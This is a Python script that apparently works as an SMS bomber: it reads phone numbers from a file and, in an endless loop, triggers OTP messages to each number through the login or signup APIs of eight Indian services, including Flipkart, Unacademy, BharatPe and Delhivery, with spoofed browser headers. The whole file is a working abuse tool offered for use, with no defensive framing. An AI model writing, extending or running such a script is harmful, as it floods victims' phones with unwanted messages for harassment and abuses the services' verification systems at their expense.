import requests,time

def read_phone_number(file_path):
    with open(file_path, 'r') as file:
        return file.read().strip()

def send_maruti_otp(phone_number):
    headers = {
        'authority': 'www.marutisuzuki.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.marutisuzuki.com',
        'referer': 'https://www.marutisuzuki.com/book-a-test-drive/verify-user',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {
        'phoneNumber': phone_number,
        'value': '3',
        'name': '',
        'email': '',
    }
    return requests.post('https://www.marutisuzuki.com/api/sitecore/QuickLinks/SendOTP', headers=headers, data=data)

def send_bharatpe_otp(phone_number):
    headers = {
        'authority': 'api-consumer.bharatpe.in',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'clientid': 'postpe',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://postpe.app',
        'referer': 'https://postpe.app/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }
    json_data = {
        'hashKey': '',
        'mobile': phone_number,
        'serviceName': 'POSTPE_LEAD_GENERATION',
        'type': 'MOBILE',
    }
    return requests.post('https://api-consumer.bharatpe.in/generic/customer/otp/generate', headers=headers, json=json_data)

def send_delhivery_otp(phone_number):
    headers = {
        'authority': 'dlv-api.delhivery.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en',
        'origin': 'https://www.delhivery.com',
        'referer': 'https://www.delhivery.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }
    return requests.get(f'https://dlv-api.delhivery.com/client-profile/otp/generate/{phone_number}', headers=headers)

def send_infinitylearn_otp(phone_number):
    headers = {
        'authority': 'otp.infinitylearn.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://infinitylearn.com',
        'referer': 'https://infinitylearn.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-tenant': 'infinitylearn',
    }
    json_data = {
        'isd_code': '+91',
        'phone': phone_number,
        'tenant_id': '1',
        'product_id': '300',
    }
    return requests.post('https://otp.infinitylearn.com/api/generateOTP', headers=headers, json=json_data)

def send_mybillbook_otp(phone_number):
    headers = {
        'authority': 'mybillbook.in',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'client': 'web',
        'content-type': 'application/json',
        'origin': 'https://mybillbook.in',
        'referer': 'https://mybillbook.in/app/login?source=iframe&utm_source=google&utm_source=google&utm_campaign=MBB-Search-DynamicSearchAd-PanIndia-Jan24&utm_campaign=MBB-Search-DynamicSearchAd-PanIndia-Jan24&utm_term=&utm_term=&utm_medium=cpc&utm_medium=cpc&gad_source=1&gclid=EAIaIQobChMI3ejwgOfihQMVVh-DAx3WGAfBEAAYASAAEgIlR_D_BwE',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }
    json_data = {
        'mobile_number': phone_number,
        'source': 'landing',
    }
    return requests.post('https://mybillbook.in/api/web/request_otp', headers=headers, json=json_data)

def send_zolostays_otp(phone_number):
    headers = {
        'authority': 'api.zolostays.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'app_name': 'CUSTOMER_WEB',
        'content-type': 'application/json',
        'origin': 'https://zolostays.com',
        'referer': 'https://zolostays.com/login?login',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }
    json_data = {
        'primary_contact': phone_number,
    }
    return requests.post('https://api.zolostays.com/api/v2/user/otp', headers=headers, json=json_data)

def send_unacademy_otp(phone_number):
    headers = {
        'authority': 'unacademy.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://unacademy.com',
        'referer': 'https://unacademy.com/goal/cdsafcatcapf/TUNWK/subscriptions?utm_source=google&utm_campaign=Google_PMax_RM_Web_Defence_Unlock-Mar%2724&utm_content=&utm_term=&gad_source=1&gclid=EAIaIQobChMIkfWkz-nihQMVPKJmAh0LfA4ZEAAYASAAEgJc6fD_BwE',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-platform': '7',
    }
    params = {
        'enable-email': 'true',
    }
    json_data = {
        'phone': phone_number,
        'country_code': 'IN',
        'otp_type': 1,
        'email': '',
        'send_otp': True,
        'is_un_teach_user': False,
    }
    return requests.post('https://unacademy.com/api/v3/user/user_check/', params=params, headers=headers, json=json_data)

def send_flipkart_otp(phone_number):
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://www.flipkart.com',
        'Referer': 'https://www.flipkart.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'X-user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36 FKUA/msite/0.0.3/msite/Mobile',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    json_data = {
        'actionRequestContext': {
            'type': 'LOGIN_IDENTITY_VERIFY',
            'loginIdPrefix': '+91',
            'loginId': phone_number,
            'clientQueryParamMap': {
                'ret': '/',
                'entryPage': 'HEADER_ACCOUNT',
            },
            'loginType': 'MOBILE',
            'verificationType': 'OTP',
            'screenName': 'LOGIN_V4_MOBILE',
            'sourceContext': 'DEFAULT',
        },
    }
    return requests.post('https://2.rome.api.flipkart.com/1/action/view', headers=headers, json=json_data)

def send_all_otps():
    phone_numbers_file = 'phone_numbers.txt'
    phone_numbers = read_phone_number(phone_numbers_file).split('\n')
    for phone_number in phone_numbers:
        print(f"Sending OTPs to {phone_number}...")
        try:
            response = send_maruti_otp(phone_number)
            print("Maruti Suzuki OTP Sent:", response.status_code)
            time.sleep(60)
            response = send_bharatpe_otp(phone_number)
            print("BharatPe OTP Sent:", response.status_code)
            time.sleep(60)
            response = send_delhivery_otp(phone_number)
            print("Delhivery OTP Sent:", response.status_code)
            time.sleep(60)
            response = send_infinitylearn_otp(phone_number)
            print("Infinity Learn OTP Sent:", response.status_code)
            time.sleep(60)
            response = send_mybillbook_otp(phone_number)
            print("MyBillBook OTP Sent:", response.status_code)
            time.sleep(60)
            response = send_zolostays_otp(phone_number)
            print("ZoloStays OTP Sent:", response.status_code)
            time.sleep(60)
            response = send_unacademy_otp(phone_number)
            print("Unacademy OTP Sent:", response.status_code)
            time.sleep(60)
            response = send_flipkart_otp(phone_number)
            print("Flipkart OTP Sent:", response.status_code)
            time.sleep(60)
            print()
        except Exception as e:
            print(f"Error sending OTPs to {phone_number}: {e}")

while True:
    send_all_otps()